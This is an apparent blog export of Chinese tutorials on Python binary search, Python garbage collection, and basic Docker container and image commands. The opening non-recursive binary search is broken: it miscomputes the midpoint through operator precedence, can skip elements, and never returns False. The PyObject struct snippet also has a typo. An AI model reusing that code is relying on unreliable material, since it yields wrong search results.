<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><h5 id="递归实现"><a href="#递归实现" class="headerlink" title="递归实现"></a>递归实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(nums, target)</span>:</span></div><div class="line">    length = len(nums)</div><div class="line">    <span class="keyword">if</span> length &lt; <span class="number">1</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">    mid = length // <span class="number">2</span></div><div class="line">    <span class="keyword">if</span> nums[mid] &gt; target:</div><div class="line">        <span class="keyword">return</span> binary_search(nums[<span class="number">0</span>:mid], target)</div><div class="line">    <span class="keyword">elif</span> nums[mid] &lt; target:</div><div class="line">        <span class="keyword">return</span> binary_search(nums[mid+<span class="number">1</span>:], target)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>
<h5 id="非递归实现"><a href="#非递归实现" class="headerlink" title="非递归实现"></a>非递归实现</h5><figure class="highlight python"><table><tr><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">binary_search</span><span class="params">(nums, target)</span>:</span></div><div class="line">    left = <span class="number">0</span></div><div class="line">    right = len(nums)<span class="number">-1</span></div><div class="line">    <span class="keyword">while</span> left &lt; right:</div><div class="line">        mid = left+right // <span class="number">2</span></div><div class="line">        <span class="keyword">if</span> nums[mid] &gt; target:</div><div class="line">            right = mid - <span class="number">1</span></div><div class="line">        <span class="keyword">elif</span> nums[mid] &lt; target:</div><div class="line">            left = mid + <span class="number">1</span></div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Algorithm</category>
        <category>Data structure</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python 垃圾回收机制</title>
    <url>/2019/02/18/Python-%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<center>Python 垃圾回收机制学习。</center>

<a id="more"></a>
<p>　　Python 的垃圾回收采用的是<code>引用计数</code>机制为主，<code>标记-清除</code> 和 <code>分代收集</code> 两种机制为辅的策略。</p>
<h4 id="引用计数"><a href="#引用计数" class="headerlink" title="引用计数"></a>引用计数</h4><p>　　Python 中万物皆对象，它们的核心就是一个结构体：<code>PyObject</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><div class="line"> typedef struct_object &#123;</div><div class="line"> 	int ob_refcnt;</div><div class="line">	struct_typeobject *ob_type;</div><div class="line">&#125; PyObject;</div></pre></td></tr></table></figure>
<p>　　其中 ob_refcnt 就是做为引用计数。当一个对象有新的引用时，它的 ob_refcnt 就会增加，当引用它的对象被删除，它的 ob_refcnt 就会减少。因此，由于 Python 中的每个对象都有一个引用计数，用来计数该对象在不同场所分别被引用了多少次。每当引用一次 Python 对象，相应的引用计数就增1，每当消毁一次 Python 对象，则相应的引用就减 1，只有当引用计数为零时，才真正从内存中删除 Python 对象。</p>
<ol>
<li><strong>导致引用计数 +1 的情况</strong>：<ul>
<li>对象被创建，例如 <code>a=23</code> ；</li>
<li>对象被引用，例如 <code>b=a</code> ；</li>
<li>对象被作为参数，传入到一个函数中，例如 <code>func(a)</code> ；</li>
<li>对象作为一个元素，存储在容器中，例如 <code>list1=[a,a]</code> ；</li>
</ul>
</li>
<li><strong>导致引用计数 -1 的情况</strong>：<ul>
<li>对象的别名被显式销毁，例如 <code>del a</code> ；</li>
<li>对象的别名被赋予新的对象，例如 <code>a=24</code> ；</li>
<li>一个对象离开它的作用域，例如 f 函数执行完毕时，func 函数中的局部变量（全局变量不会）；</li>
<li>对象所在的容器被销毁，或从容器中删除对象。</li>
</ul>
</li>
</ol>
<p>　　<strong>引用计数机制的优点</strong>：</p>
<ol>
<li>简单；</li>
<li>实时性：一旦没有引用，内存就直接释放了。不用像其他机制等到特定时机。实时性还带来一个好处：处理回收内存的时间分摊到了平时。</li>
</ol>
<p>　　<strong>引用计数机制的缺点</strong>：</p>
<ol>
<li>维护引用计数消耗资源；</li>
<li>循环引用。</li>
</ol>
<p>　　什么是循环引用？A 和 B 相互引用而再没有外部引用 A 与 B 中的任何一个，它们的引用计数虽然都为1，但显然应该被回收。</p>
<h4 id="标记-清除"><a href="#标记-清除" class="headerlink" title="标记-清除"></a>标记-清除</h4><p>　　如果是只使用引用计数法的话，循环引用并不会被回收，它会一直驻留在内存中，就会造成了内存泄漏（内存空间在使用完毕后未释放）。标记－清除的出现打破了循环引用，也就是它只关注那些可能会产生循环引用的对象，显然，像是 PyIntObject、PyStringObject 这些不可变对象是不可能产生循环引用的，因为它们内部不可能持有其它对象的引用。Python 中的循环引用总是发生在 container 对象之间，也就是能够在内部持有其它对象的对象，比如 list、dict、class 等等。这也使得该方法带来的开销只依赖于 container 对象的的数量。</p>
<p>　　标记清除（Mark—Sweep）算法是一种基于追踪回收技术实现的垃圾回收算法。它分为两个阶段：第一阶段是标记阶段，GC（Garbage Collection，垃圾回收）会把所有的『活动对象』打上标记，第二阶段是把那些没有标记的对象『非活动对象』进行回收。原理与流程如下：</p>
<p><img src="http://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/2/18-1.png" alt="18-1"></p>
<ul>
<li><p>首先初始所有对象标记为白色，并确定根节点对象（这些对象是不会被删除），标记它们为黑色（表示对象有效）。</p>
</li>
<li><p>将有效对象引用的对象标记为灰色（表示对象可达，但它们所引用的对象还没检查），检查完灰色对象引用的对象后，将灰色标记为黑色。</p>
</li>
<li><p>重复直到不存在灰色节点为止。最后白色结点都是需要清除的对象。</p>
</li>
</ul>
<p>　　<strong>标记-清除的缺点</strong>：</p>
<p>　　标记-清除机制所带来的额外操作和需要回收的内存块成正比。</p>
<h4 id="分代技术"><a href="#分代技术" class="headerlink" title="分代技术"></a>分代技术</h4><p>　　分代回收是一种以空间换时间的操作方式，Python 将内存根据对象的存活时间划分为不同的集合，每个集合称为一个代，Python 将内存分为了3“代”，分别为年轻代（第0代）、中年代（第1代）、老年代（第2代），他们对应的是 3 个链表，它们的垃圾收集频率与对象的存活时间的增大而减小。</p>
<p>　　新创建的对象都会分配在年轻代，年轻代链表的总数达到上限时，Python 垃圾收集机制就会被触发，把那些可以被回收的对象回收掉，而那些不会回收的对象就会被移到中年代去，依此类推，老年代中的对象是存活时间最久的对象，甚至是存活于整个系统的生命周期内。同时，分代回收是建立在标记清除技术基础之上。分代回收同样作为 Python 的辅助垃圾收集技术处理那些容器对象。</p>
]]></content>
      <categories>
        <category>Coding</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 基本操作-容器篇</title>
    <url>/2019/02/12/Docker-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-%E5%AE%B9%E5%99%A8%E7%AF%87/</url>
    <content><![CDATA[<p><center>Docker 容器基本操作介绍。</center><br><a id="more"></a></p>
<h4 id="启动与运行"><a href="#启动与运行" class="headerlink" title="启动与运行"></a>启动与运行</h4><p>　　启动容器有两种方式，一种是基于镜像新建一个容器并启动，另外一个是将在终止状态（stopped ） 的容器重新启动。使用 <code>docker run</code> 或 <code>docker container run</code>  命令基于镜像新建并启动一个新的容器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker run [OPTIONS] IMAGE [COMMAND] [ARG...]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container run [OPTIONS] IMAGE [COMMAND] [ARG...]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>-d</code> ：表示后台运行；</li>
<li>选项 <code>-i</code>：以交互模式运行容器，通常与 <code>-t</code> 同时使用；</li>
<li>选项 <code>-t</code>：为容器重新分配一个伪输入终端，通常与 <code>-i</code> 同时使用；</li>
<li>选项 <code>-P</code> ：随机端口映射；</li>
<li>选项 <code>-p</code> ：指定端口映射，有 4 种形式：<code>ip:hostPort:containerPort</code> 、<code>ip::containerPort</code> 、<code>hostPort:containerPort</code> 、<code>containerPort</code> ；</li>
<li>选项 <code>--network</code> ：指定网络模式， 该选项有以下可选参数： <ul>
<li><code>--network=bridge</code>： 默认选项， 表示连接到默认的网桥；</li>
<li><code>--network=host</code>： 容器使用宿主机的网络；</li>
<li><code>--network=container:NAME_or_ID</code>： 告诉 Docker 让新建的容器使用已有容器的网络配置；</li>
<li><code>--network=none</code>： 不配置该容器的⽹络， 用户可自定义网络配置。 </li>
</ul>
</li>
<li>选项 <code>--dns</code>： 指定容器使用的 DNS 服务器，默认和宿主一致；</li>
<li>……（参数列表可查看官方文档）</li>
</ul>
<p>　　当利用 <code>docker run</code> 或 <code>`docker container run</code> 命令来创建容器时，Docker 在后台运行的标准操作包括：</p>
<ul>
<li>检查本地是否存在指定的镜像，不存在就从公有仓库下载</li>
<li>利用镜像创建并启动一个容器</li>
<li>分配一个文件系统，并在只读的镜像层外面挂载一层可读写层</li>
<li>从宿主主机配置的网桥接口中桥接一个虚拟接口到容器中去</li>
<li>从地址池配置一个 ip 地址给容器</li>
<li>执行用户指定的应用程序</li>
<li>执行完毕后容器被终止</li>
</ul>
<p>　　操作示例，使用容器输出一个 “Hello World”，之后终止容器： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run ubuntu /bin/echo 'Hello world'</div><div class="line">Hello world</div></pre></td></tr></table></figure>
<h5 id="交互模式"><a href="#交互模式" class="headerlink" title="交互模式"></a>交互模式</h5><p>　　<code>docker run</code> 或 <code>docker container run</code>  命令，通过 <code>-t</code> 选项让 Docker 分配一个伪终端并绑定到容器的标准输入上，<code>-i</code> 选项则让容器的标准输入保持打开。</p>
<p>　　通过 <code>ctrl+p+q</code> 可以退出容器但不关闭,，使用 <code>docker ps</code> 查看有运行的容器的信息，示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run -it ubuntu</div><div class="line">root@bd60ba8b2925:/# 此时，已是分配的绑定到容器的伪终端</div><div class="line">root@d8fdaf7ec19b:/# root@iZwz96uyro861qckgz89ljZ:~# 此时，ctrl+p+q 退回到宿主机的终端</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">d8fdaf7ec19b        ubuntu              "/bin/bash"         16 seconds ago      Up 16 seconds                           awesome_wiles</div></pre></td></tr></table></figure>
<p>　　而，使用 <code>ctrl+d</code> 或者<code>exit</code> 则可以直接退出容器且关闭，<code>docker ps</code> 查看无信息。示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run -it ubuntu</div><div class="line">root@bd60ba8b2925:/# exit</div><div class="line">exit</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# 通过exit退出，返回到宿主机的终端</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~#</div></pre></td></tr></table></figure>
<h5 id="后台运行"><a href="#后台运行" class="headerlink" title="后台运行"></a>后台运行</h5><p>　　<code>docker run</code> 或 <code>docker container run</code>  命令，通过添加 <code>-d</code> 参数让 Docker 在后台运行而不是直接把执行命令的结果输出在当前宿主机下。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run -d ubuntu /bin/bash -c "while true; do echo hello world; sleep 1; done"</div><div class="line">5ed90f3deafe93f0102f0ecc619550c965334ff0a772fecc377cbefab5cdfc4c</div></pre></td></tr></table></figure>
<p>　　使用 <code>-d</code> 参数启动后会返回一个唯一的 id，并不会把输出的结果打印到宿主机上面，可以通过 <code>docker ps</code> 或 <code>docker container ls</code> 命令来查看容器信息。 要获取容器的输出信息，可以通过 <code>docker container logs</code> 命令。示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker logs 5ed90f3deafe</div><div class="line">hello world</div><div class="line">hello world</div><div class="line">hello world</div></pre></td></tr></table></figure>
<p>　　注： 容器是否会长久运行，是和 <code>docker run</code> 或 <code>docker container run</code>  指定的命令有关，和 <code>-d</code> 参数无关。 </p>
<h4 id="列出容器"><a href="#列出容器" class="headerlink" title="列出容器"></a>列出容器</h4><p>　　命令 <code>docker ps</code> 和 <code>docker container ls</code> 用于列出运行中的容器。如需列出所有容器（包括已停止的容器），可使用 <code>-a</code> 参数。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker ps [OPTIONS]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container ls [OPTIONS]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--all, -a</code> ：显示所有的容器，包括未运行的；</li>
<li>选项 <code>--filter, -f</code> ：根据条件过滤显示的内容；</li>
<li>选项 <code>--format</code> ：指定返回值的模板文件；</li>
<li>选项  <code>--latest, -l</code> ：显示最近创建的容器；</li>
<li>选项 <code>--last , -n</code> ：列出最近创建的n个容器；</li>
<li>选项 <code>--no-trunc</code> ：不截断输出；</li>
<li>选项 <code>--quiet, -q</code> ：静默模式，只显示容器编号；</li>
<li>选项 <code>--size , -s</code> ：显示总的文件大小。</li>
</ul>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run -d ubuntu /bin/bash -c "while true; do echo hello world; sleep 1; done"</div><div class="line">5ed90f3deafe93f0102f0ecc619550c965334ff0a772fecc377cbefab5cdfc4c</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">5ed90f3deafe        ubuntu              "/bin/bash -c 'while…"   3 seconds ago       Up 2 seconds                            ecstatic_nobel</div></pre></td></tr></table></figure>
<ul>
<li><code>CONTAINER_ID</code>： 表示容器ID。</li>
<li><code>IMAGE</code>： 表示镜像名称。</li>
<li><code>COMMAND</code>： 表示启动容器时运行的命令。</li>
<li><code>CREATED</code>： 表示容器的创建时间。</li>
<li><code>STATUS</code>： 表示容器运行的状态。 Up 表示运行中， Exited 表示已停止。</li>
<li><code>PORTS</code>： 表示容器对外的端口号。</li>
<li><code>NAMES</code>： 表示容器名称。 该名称默认由 <code>Docker</code> 自动生成， 也可使用 <code>docker run</code> 命令的 <code>--name</code> 选项<br>自行指定。 </li>
</ul>
<h4 id="进入容器"><a href="#进入容器" class="headerlink" title="进入容器"></a>进入容器</h4><p>　　使用交互模式启动一个容器，再通过 <code>ctrl+p+q</code> 退回到宿主机的终端，即切换到后台运行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker run -it ubuntu</div><div class="line">root@76866ccb8619:/# root@iZwz96uyro861qckgz89ljZ:~# 此时，ctrl+p+q 退回到宿主机的终端，容器没有被关闭</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps # 查看容器状态</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">76866ccb8619        ubuntu              "/bin/bash"         10 seconds ago      Up 9 seconds                            condescending_ptolemy</div></pre></td></tr></table></figure>
<p>　　此时，如果想要进入运行着的容器则可以使用命令 <code>docker attach</code> 、<code>nsenter</code>和 <code>docker exec</code> 。</p>
<h5 id="docker-attach"><a href="#docker-attach" class="headerlink" title="docker attach"></a>docker attach</h5><p>　　使用 <code>docker attach</code> 或 <code>docker container attach</code> 命令进入容器。命令格式： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker attach [OPTIONS] CONTAINER COMMAND [ARG...]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container attach [OPTIONS] CONTAINER</span></div></pre></td></tr></table></figure>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker attach 76866ccb8619</div><div class="line">root@76866ccb8619:/# 已经进入到容器内</div></pre></td></tr></table></figure>
<p>　　但是，很多场景下， 使用 <code>docker attach</code> 命令并不方便。 当多个窗口同时 <code>attach</code> 到同⼀个容器时， 所有窗口都会同步显示。 同理， 如果某个窗口发生阻塞， 其他窗口也无法执行操作。 </p>
<h5 id="nsenter"><a href="#nsenter" class="headerlink" title="nsenter"></a>nsenter</h5><p>　　nsenter 工具可以访问另一个进程的名称空间，它已经被包含在 util-linux 2.23 或更高版本中。为了连接到容器， 需要找到容器第⼀个进程的 PID 。首先，使用 <code>docker inspect</code> 来查看该容器的详细信息，截取 PID 部分进行显示：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker inspect -f &#123;&#123;.State.Pid&#125;&#125; <span class="variable">$CONTAINER_ID</span></span></div></pre></td></tr></table></figure>
<p>　　获得 PID 后， 然后使用 nsenter 命令进入容器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> nsenter --target <span class="string">"<span class="variable">$PID</span>"</span> --mount --uts --ipc --net --pid</span></div></pre></td></tr></table></figure>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">76866ccb8619        ubuntu              "/bin/bash"         10 seconds ago      Up 9 seconds                            condescending_ptolemy</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker inspect -f &#123;&#123;.State.Pid&#125;&#125; 76866ccb8619</div><div class="line">31542</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# nsenter --target 31542 --mount --uts --ipc --net --pid    </div><div class="line">mesg: ttyname failed: No such device</div><div class="line">root@76866ccb8619:/# 已经进入到容器内</div></pre></td></tr></table></figure>
<p>　　测试发现，通过这种，<code>ctrl+p+q</code> 也无法退回到宿主机的终端，需要使用 <code>exit</code> ，此时的 <code>exit</code> 并不会关闭容器。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@76866ccb8619:/# 此时，ctrl+p+q 也无法退回到宿主机的终端</div><div class="line">root@76866ccb8619:/# exit</div><div class="line">logout</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">76866ccb8619        ubuntu              "/bin/bash"         9 minutes ago       Up 9 minutes                            condescending_ptolemy</div></pre></td></tr></table></figure>
<h5 id="docker-exec（推荐）"><a href="#docker-exec（推荐）" class="headerlink" title="docker exec（推荐）"></a>docker exec（推荐）</h5><p>　　在运行的容器中执行命令 <code>docker exec</code> 。命令格式：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">exec</span> [OPTIONS] CONTAINER COMMAND [ARG...]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>-d</code> ：分离模式，在后台运行；</li>
<li>选项 <code>-i</code> ：即使没有附加也保持 STDIN 打开；</li>
<li>选项 <code>-t</code> ：分配一个伪终端；</li>
</ul>
<p>　　只用 <code>-i</code> 参数时，由于没有分配伪终端，界面没有我们熟悉的 Linux 命令提示符，但命令执行结果仍然可以返回。当 <code>-i -t</code> 参数一起使用时，则可以看到我们熟悉的 Linux 命令提示符。</p>
<p>　　注意，该命令必须提供两个参数，一是容器名或ID，二是在运行的容器中执行的命令。操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker exec -it 76866ccb8619 /bin/bash</div><div class="line">root@76866ccb8619:/#</div></pre></td></tr></table></figure>
<h4 id="终止容器"><a href="#终止容器" class="headerlink" title="终止容器"></a>终止容器</h4><p>　　命令<code>docker stop</code> 和 <code>docker container stop</code> 命令用于终止容器。命令格式： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker stop [OPTIONS] CONTAINER [CONTAINER...]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container stop [OPTIONS] CONTAINER [CONTAINER...]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--time, -t</code> ：强制杀死容器前等待的时间， 单位是秒，默认值 10。</li>
</ul>
<p>　　当 Docker 容器中指定的应用终结时，容器也自动终止。 终止状态的容器可以用 <code>docker container ls -a</code> 命令看到。 处于终止状态的容器，可以通过 <code>docker container start</code> 命令来重新启动。此外， <code>docker container restart</code> 命令会将一个运行态的容器终止，然后再重新启动它。 </p>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker stop 76866ccb8619</div><div class="line">76866ccb8619</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div></pre></td></tr></table></figure>
<h4 id="启动已终止容器"><a href="#启动已终止容器" class="headerlink" title="启动已终止容器"></a>启动已终止容器</h4><p>　　对于已停止的容器， 可使用 <code>docker start</code> 命令来启动。命令格式： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker start [OPTIONS] CONTAINER [CONTAINER...]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container start [OPTIONS] CONTAINER [CONTAINER...]</span></div></pre></td></tr></table></figure>
<p>　　操作示例，使用 <code>docker ps -a</code> 找到已停止的容器的ID，然后通过 <code>docker start</code> 命令将其再次启动：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps -a</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS                      PORTS               NAMES</div><div class="line">76866ccb8619        ubuntu              "/bin/bash"         31 minutes ago      Exited (0) 13 minutes ago                       condescending_ptolemy</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker start 76866ccb8619</div><div class="line">76866ccb8619</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">76866ccb8619        ubuntu              "/bin/bash"         32 minutes ago      Up 3 seconds                            condescending_ptolemy</div></pre></td></tr></table></figure>
<h4 id="重启容器"><a href="#重启容器" class="headerlink" title="重启容器"></a>重启容器</h4><p>　　使用 <code>docker restart</code> 命令来重启容器。 该命令实际上是先执行了 <code>docker stop</code> 命令， 然后执行了 <code>docker start</code> 命令。命令格式： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker restart [OPTIONS] CONTAINER [CONTAINER...]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container restart [OPTIONS] CONTAINER [CONTAINER...]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--time, -t</code> ：关闭容器前等待的时间， 单位是秒，默认是 10 。</li>
</ul>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker restart 76866ccb8619</div><div class="line">76866ccb8619</div></pre></td></tr></table></figure>
<h4 id="导出和导入容器"><a href="#导出和导入容器" class="headerlink" title="导出和导入容器"></a>导出和导入容器</h4><h5 id="导出容器"><a href="#导出容器" class="headerlink" title="导出容器"></a>导出容器</h5><p>　　使用 <code>docker export</code> 或 <code>docker container export</code> 命令，导出容器快照到本地文件：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker <span class="built_in">export</span> [OPTIONS] CONTAINER</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container <span class="built_in">export</span> [OPTIONS] CONTAINER</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--output, -o</code> ：将输入内容写到文件。</li>
</ul>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker ps</div><div class="line">CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES</div><div class="line">76866ccb8619        ubuntu              "/bin/bash"         35 minutes ago      Up About a minute                       condescending_ptolemy</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker export 76866ccb8619 &gt; ubuntu.tar</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# ls</div><div class="line">ubuntu.tar</div></pre></td></tr></table></figure>
<h5 id="导入容器"><a href="#导入容器" class="headerlink" title="导入容器"></a>导入容器</h5><p>　　使用 <code>docker import</code> 命令，从容器快照文件中再导入为镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>-c</code> ：应用docker 指令创建镜像；</li>
<li>选项 <code>-m</code> ：提交时的说明文字。</li>
</ul>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# cat ubuntu.tar | docker import - my/ubuntu:v1.0  </div><div class="line">sha256:e4f23944020551aaa9da470d3af9520cb6e8d5857c855bedf8f3345e524a57a4</div><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker image ls</div><div class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</div><div class="line">my/ubuntu           v1.0                e4f239440205        8 seconds ago       69.8MB</div></pre></td></tr></table></figure>
<p>　　此外，也可以通过指定 URL 或者某个目录来导入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker import URL 镜像标签</span></div></pre></td></tr></table></figure>
<p>　　既可以使用 <code>docker load</code> 来导入镜像存储文件到本地镜像库，也可以使用 <code>docker import</code> 来导入一个容器快照到本地镜像库。区别在于容器快照文件将丢弃所有的历史记录和元数据信息（即仅保存容器当时的快照状态） ，而镜像存储文件将保存完整记录，体积也要大。此外，从容器快照文件导入时可以重新指定标签等元数据信息。 </p>
<h4 id="删除容器"><a href="#删除容器" class="headerlink" title="删除容器"></a>删除容器</h4><p>　　命令 <code>docker rm</code> 和 <code>docker container rm</code> 用于删除一个处于终止状态的容器。命令格式： </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker rm [OPTIONS] CONTAINER [CONTAINER...]</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> docker container rm [OPTIONS] CONTAINER [CONTAINER...]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>--force, -f</code> ：通过 SIGKILL 信号强制删除正在运行中的容器；</li>
<li>选项 <code>--link, -l</code>：删除容器间的网络连接；</li>
<li>选项 <code>--volumes, -v</code> ：删除与容器关联的卷。</li>
</ul>
<p>　　不加 <code>-f</code> 选项的命令只能删除已停止的容器， 如需删除正在运行的容器， 需使用 <code>-f</code> 参数。 如果要删除所有的容器：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker rm -f $(docker ps -a -q)</span></div></pre></td></tr></table></figure>
<p>　　清理所有处于终止状态的容器 ：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker container prune</span></div></pre></td></tr></table></figure>
<p>　　操作示例：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line">root@iZwz96uyro861qckgz89ljZ:~# docker rm -f 76866ccb8619</div><div class="line">76866ccb8619</div></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Cloud/Edge Computing</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 基本操作-镜像篇（下）</title>
    <url>/2019/02/06/Docker-%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C-%E9%95%9C%E5%83%8F%E7%AF%87%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
    <content><![CDATA[<p><center>Docker 镜像基本操作介绍。</center><br><a id="more"></a></p>
<h4 id="基于容器构建镜像"><a href="#基于容器构建镜像" class="headerlink" title="基于容器构建镜像"></a>基于容器构建镜像</h4><p>　　在上篇中已经介绍了如何基于运行着的容器生成镜像：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</span></div></pre></td></tr></table></figure>
<ul>
<li>选项 <code>-a</code> ：提交的镜像作者；</li>
<li>选项 <code>-c</code> ：使用 Dockerfile 指令来创建镜像；</li>
<li>选项 <code>-m</code> ：提交时的说明文字；</li>
<li>选项 <code>-p</code> ：在 commit 时，将容器暂停。</li>
</ul>
